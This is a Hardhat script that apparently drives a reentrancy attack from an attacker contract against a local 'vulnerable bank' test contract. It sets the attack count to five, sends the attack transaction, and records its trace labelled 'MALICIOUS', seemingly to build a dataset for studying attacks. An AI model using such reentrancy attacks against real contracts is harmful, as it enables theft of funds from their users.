  const path = require("path");
  const {ethers} = require("hardhat");
  const {saveTrace} = require("../../utils/saveTrace.js");
  const {loadContext} = require ("../../utils/context.js");
  const {displayState} = require("../../utils/displayState2.js")
  const { transaction_reccord_values } = require("../scripts/simulate_transaction.js");
  require("dotenv").config();

  async function main () {
    const ctx = await loadContext();

    // check accounts state brfotr trsndsction
    let attackCount = await ctx.contractAttacker2.MAX_ATTACKS();
    const balancesMapping1 = await ctx.contractReentrancyTest.balances(ctx.signer);
    await displayState("Before Attack", [
    { name: "Victim (vulnerable bank)", address: ctx.VulnerableBankAddress },
    { name: "Attacker Contract", address: ctx.Attacker2Address, notes: `attackCount: ${attackCount}` },
    { name: "Signer", address: ctx.signer.address, notes: `balances[signer]: ${ethers.formatEther(balancesMapping1)} ETH` }
]);

//transaction update the the attackCount value
    const tx1 = await ctx.contractAttacker2.setMaxAttacks(5); // whichever value you're testing
    const receipt1 = await tx1.wait();
    console.log("setMaxAttacks tx hash:", receipt1.hash);
    console.log("New MAX_ATTACKS value:", await ctx.contractAttacker2.MAX_ATTACKS());

// send transaction -- example deposit()
    const amount = ethers.parseEther("1.3");
    const calldata = ctx.contractAttacker2.interface.encodeFunctionData("attack");
    const tx = await ctx.signer.sendTransaction({
          to : ctx.Attacker2Address,
          data: calldata,
          value: ethers.parseEther("0.0000001")    
      })
    const receipt = await tx.wait();
    console.log(tx.hash);

    // ── record the transaction ──────────────────────────────────
      
   console.log("\nRecording transaction...");
       const attack_name = "sf_reentrancy"; 
       const outputDir1 = path.join(__dirname, "../../traces_tests/reenAttack/full"); 
       const filePrefix1 = "five_attack";
       const baseOutputDir = path.join(__dirname, "../../traces_tests/reenAttack/internal");
       const folderName = "five_attack";
       const function_name = "five_attack()";
       const fromRole = "ATTACKER";
       const toRole = "ATTACKER";
       const transactionPurpose = "MALICIOUS"; 
   
       const result = await transaction_reccord_values(
           tx.hash,                  // the attack transaction hash
           attack_name,
           transactionPurpose,
           outputDir1,
           filePrefix1, 
           baseOutputDir, 
           folderName,
           fromRole,  
           toRole,
           function_name     // folderName
       );
         
        console.log("Record result:", result);

    // ────────────────────────────────────────────────────────────
    attackCount = await ctx.contractAttacker2.MAX_ATTACKS();
    const balancesMapping2 = await ctx.contractVulnerableBank.balances(ctx.signer);
    await displayState("After Attack", [
    { name: "Victim (vulnerable bank)", address: ctx.VulnerableBankAddress },
    { name: "Attacker Contract", address: ctx.Attacker2Address, notes: `MAX_ATTACKS: ${attackCount}` },
    { name: "Signer", address: ctx.signer.address, notes: `balances[signer]: ${ethers.formatEther(balancesMapping2)} ETH` }
    ]);
  }
  main().catch(console.error);
